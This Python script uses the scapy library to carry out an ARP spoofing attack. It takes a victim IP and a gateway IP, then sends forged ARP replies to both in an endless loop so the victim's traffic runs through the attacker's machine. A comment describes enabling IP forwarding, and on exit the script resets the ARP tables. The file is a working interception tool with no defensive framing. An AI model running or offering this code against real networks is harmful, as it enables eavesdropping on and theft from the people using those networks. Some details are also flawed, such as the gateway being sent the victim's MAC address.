

"""

arp protocol vulnerability

"""



import time

import scapy.all as scapy

import argparse


def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="target", help="Target IP. Victim.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP. Wifi router, for example")

    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify an target, use --help for more info")
    
    if not options.gateway:
        parser.error("[-] Please specify an gateway, use --help for more info")

    return options




def get_mac(ip):

    # create arp packet
    arp_request = scapy.ARP(pdst=ip)
    
    # create broadcast frame
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request

    try:
        # send arp packet
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose=True)[0]

        # get and return mac
        mac_address = answered_list[0][1].hwsrc
        return mac_address
    except:
        print('Fail in getting mac from ' + ip)


def spoof(target_ip, target_mac, spoof_ip):
    """
        
    """

    # create paclet
    packet = scapy.ARP(
        op=2,
        pdst=target_ip, # target
        hwdst=target_mac, # mac target
        psrc = spoof_ip # fake source
    )

    # send packet
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_map = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_map)

    scapy.send(packet, count=4, verbose=False)



# 
def main():
    # todo read /proc/sys/net/ipv4/ip_forward
    # if != 1
    #   sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward


    options = get_args()

    target_ip = options.target
    gateway_ip = options.gateway


    target_mac = get_mac(target_ip)

    sent_packets_count = 0
    try:
        print("Starting...\n")
        while True:
            try:
                spoof(target_ip=gateway_ip, target_mac=target_mac, spoof_ip=target_ip)
                spoof(target_ip=target_ip, target_mac=target_mac, spoof_ip=gateway_ip)
                sent_packets_count += 2
                print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            except Exception as e:
                print(e)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[-] Detected Ctrl + C. Resetting ARP tables... Wait.")

        restore(destination_ip=target_ip, source_ip=gateway_ip)
        restore(destination_ip=gateway_ip, source_ip=target_ip)

        print("\Quitting")


if __name__ == "__main__":
    main()